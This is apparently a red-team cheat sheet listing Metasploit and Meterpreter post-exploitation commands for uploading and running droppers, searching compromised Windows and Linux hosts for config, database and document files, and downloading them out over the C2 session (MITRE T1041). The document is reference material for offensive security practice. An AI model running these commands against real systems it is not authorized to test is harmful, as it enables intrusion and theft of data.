# Metasploit

Search Tag(s): #post-exploitation #file-transfer-and-data-exfiltration #command-and-control #T1041 #metasploit-framework

## Search specific file extensions

### Post Module

#### Linux

Upload file droppers and execute it with arguments.

```
msf > use post/multi/manage/upload_exec

msf post(multi/manage/upload_exec) > options 

Module options (post/multi/manage/upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ARGS                      no        Command-line arguments to pass to the uploaded file
   LPATH                     yes       Local file path to upload and execute
   RPATH                     no        Remote file path on target (default is basename of LPATH)
   SESSION                   yes       The session to run this module on
   TIMEOUT  60               yes       Timeout for command execution


View the full module info with the info, or info -d command.

msf post(multi/manage/upload_exec) > set lpath /path/to/local/file

msf post(multi/manage/upload_exec) > set args "[arguments]"

msf post(multi/manage/upload_exec) > set rpath /path/to/remote/file

msf post(multi/manage/upload_exec) > set session <session_ID>

msf post(multi/manage/upload_exec) > run
```

#### Windows

MSF Windows Gather Generic File Collection Post Module.

```
msf > use post/windows/gather/enum_files

msf post(windows/gather/enum_files) > options

Module options (post/windows/gather/enum_files):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_GLOBS   *.config         yes       The file pattern to search for in a filename
   SEARCH_FROM                   no        Search from a specific location. Ex. C:\
   SESSION                       yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/enum_files) > set file_globs *.txt or *.zip or *.tar.* or *.tgz or *.cab or *.rar or *.pdf or *.doc? or *.ppt? or *.pps? or *.pot? or *.xls? or *.config* or *.sql or *.db

msf post(windows/gather/enum_files) > set search_from C:\\path\\to\\directory\\

msf post(windows/gather/enum_files) > set session <session_ID>

msf post(windows/gather/enum_files) > run
```

### Meterpreter

```
meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f *.txt -f *.zip -f *.tar.* -f *.tgz -f *.cab -f *.rar -f *.pdf -f *.doc? -f *.ppt? -f *.pps? -f *.pot? -f *.xls? -f config* -f *.sql -f *.db -f *.png -f *.jpg -f *.jpeg
```

## Download Files

```
meterpreter > download -h
Usage: download [options] src1 src2 src3 ... destination

Downloads remote files and directories to the local machine.

OPTIONS:

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

Download single file.

```
meterpreter > download [<drive_letter>:]/path/to/remote/file.txt /path/to/local/directory/
```

Download multiple files using wildcard.

```
meterpreter > download [<drive_letter>:]/path/to/remote/*.txt /path/to/local/directory/
```

Download multiple files in a directory recursively.

```
meterpreter > download -r [<drive_letter>:]/path/to/remote/directory/ /path/to/local/directory/
```

TODO: Fill this info

Download and execute batch files

```
msf > use post/windows/manage/download_exec
```

Upload file droppers and execute it with arguments.

```
msf > use post/multi/manage/upload_exec

msf post(upload_exec) > options

Module options (post/multi/manage/upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ARGS                      no        Command-line arguments to pass to the uploaded file
   LPATH                     yes       Local file path to upload and execute
   RPATH                     no        Remote file path on target (default is basename of LPATH)
   SESSION                   yes       The session to run this module on
   TIMEOUT  60               yes       Timeout for command execution


View the full module info with the info, or info -d command.

msf post(multi/manage/upload_exec) > set lpath /path/to/local/file

msf post(multi/manage/upload_exec) > set args "[arguments]"

msf post(multi/manage/upload_exec) > set rpath /path/to/remote/file

msf post(multi/manage/upload_exec) > set session <session_ID>

msf post(multi/manage/upload_exec) > run
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Upload Exec Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/upload_exec.md)

### MITRE

- [MITRE T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)